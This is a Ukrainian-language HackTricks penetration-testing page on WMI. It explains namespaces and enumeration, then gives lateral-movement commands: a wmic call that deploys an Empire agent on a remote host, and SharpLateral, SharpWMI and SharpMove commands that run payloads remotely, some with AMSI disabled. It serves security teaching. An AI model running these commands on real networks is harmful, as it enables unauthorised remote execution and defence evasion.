# WmiExec

{{#include ../../banners/hacktricks-training.md}}

## Як це працює

Процеси можна відкривати на хостах, де відомі ім'я користувача та пароль або хеш, за допомогою WMI. Команди виконуються через WMI за допомогою Wmiexec, забезпечуючи напівінтерактивну роботу з shell.

**dcomexec.py:** Використовуючи різні кінцеві точки DCOM, цей скрипт забезпечує напівінтерактивну роботу з shell, подібну до `wmiexec.py`. Вибране значення `-object` визначає кінцеву точку; підтримувані об'єкти включають `MMC20.Application`, `ShellWindows` і `ShellBrowserWindow`, причому останній реалізує техніку Shell Browser Window, розглянуту в оригінальному walkthrough.<sup>[[2]](#references)[[3]](#references)</sup>

## Основи WMI

### Namespace

WMI має ієрархію, структуровану за принципом каталогів. Його контейнером верхнього рівня є \root, під яким організовані додаткові каталоги, що називаються namespaces.<sup>[[1]](#references)</sup>
Команди для переліку namespaces:
```bash
# Retrieval of Root namespaces
gwmi -namespace "root" -Class "__Namespace" | Select Name

# Enumeration of all namespaces (administrator privileges may be required)
Get-WmiObject -Class "__Namespace" -Namespace "Root" -List -Recurse 2> $null | select __Namespace | sort __Namespace

# Listing of namespaces within "root\cimv2"
Get-WmiObject -Class "__Namespace" -Namespace "root\cimv2" -List -Recurse 2> $null | select __Namespace | sort __Namespace
```
Класи в межах простору імен можна перелічити за допомогою:
```bash
gwmwi -List -Recurse # Defaults to "root\cimv2" if no namespace specified
gwmi -Namespace "root/microsoft" -List -Recurse
```
### **Класи**

Знання назви класу WMI, наприклад win32_process, і простору імен, у якому він знаходиться, має вирішальне значення для будь-якої операції WMI.  
Команди для виведення списку класів, що починаються з `win32`:
```bash
Get-WmiObject -Recurse -List -class win32* | more # Defaults to "root\cimv2"
gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*"
```
Виклик класу:
```bash
# Defaults to "root/cimv2" when namespace isn't specified
Get-WmiObject -Class win32_share
Get-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpComputerStatus
```
### Методи

Методи, які є однією або кількома виконуваними функціями класів WMI, можна виконувати.
```bash
# Class loading, method listing, and execution
$c = [wmiclass]"win32_share"
$c.methods
# To create a share: $c.Create("c:\share\path","name",0,$null,"My Description")
```

```bash
# Method listing and invocation
Invoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Description", $null, "Name", $null, "c:\share\path",0)
```
## Перерахування WMI

### Стан служби WMI

Команди для перевірки працездатності служби WMI:
```bash
# WMI service status check
Get-Service Winmgmt

# Via CMD
net start | findstr "Instrumentation"
```
### Інформація про систему та процеси

Збір інформації про систему та процеси через WMI:
```bash
Get-WmiObject -ClassName win32_operatingsystem | select * | more
Get-WmiObject win32_process | Select Name, Processid
```
Для зловмисників WMI є потужним інструментом для збору конфіденційних даних про системи або домени.<sup>[[1]](#references)</sup>
```bash
wmic computerystem list full /format:list
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list
```
Віддалене опитування WMI для отримання певної інформації, наприклад локальних адміністраторів або користувачів, які ввійшли в систему, можливе за умови ретельного формування команд.

### **Ручне віддалене опитування WMI**

Приховане визначення локальних адміністраторів на віддаленій машині та користувачів, які ввійшли в систему, можна здійснити за допомогою спеціальних WMI-запитів. `wmic` також підтримує зчитування команд із текстового файлу для одночасного виконання команд на кількох вузлах.<sup>[[1]](#references)</sup>

Для віддаленого запуску процесу через WMI, наприклад розгортання агента Empire, використовується наведена нижче структура команди; про успішне виконання свідчить повернене значення `"0"`:<sup>[[1]](#references)</sup>
```bash
wmic /node:hostname /user:user path win32_process call create "empire launcher string here"
```
Цей процес демонструє можливості WMI для віддаленого виконання та перерахування системи, підкреслюючи його корисність як для системного адміністрування, так і для penetration testing.

## Автоматичні інструменти

- [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
```
- [**SharpWMI**](https://github.com/GhostPack/SharpWMI)
```bash
SharpWMI.exe action=exec [computername=HOST[,HOST2,...]] command=""C:\\temp\\process.exe [args]"" [amsi=disable] [result=true]
# Stealthier execution with VBS
SharpWMI.exe action=executevbs [computername=HOST[,HOST2,...]] [script-specification] [eventname=blah] [amsi=disable] [time-specs]
```
- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=query computername=remote.host.local query="select * from win32_process" username=domain\user password=password
SharpMove.exe action=create computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true username=domain\user password=password
SharpMove.exe action=executevbs computername=remote.host.local eventname=Debug amsi=true username=domain\\user password=password
```
- Ви також можете використати **Impacket's `wmiexec`**.


## References

- [1] [Використання облікових даних для захоплення Windows-систем — частина 3 (WMI та WinRM)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)
- [2] [Fortra Impacket — dcomexec.py](https://github.com/fortra/impacket/blob/master/examples/dcomexec.py)
- [3] [Посібник для початківців з набору інструментів Impacket, частина 1 — Hacking Articles (Internet Archive)](https://web.archive.org/web/20190822180831/https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)
{{#include ../../banners/hacktricks-training.md}}
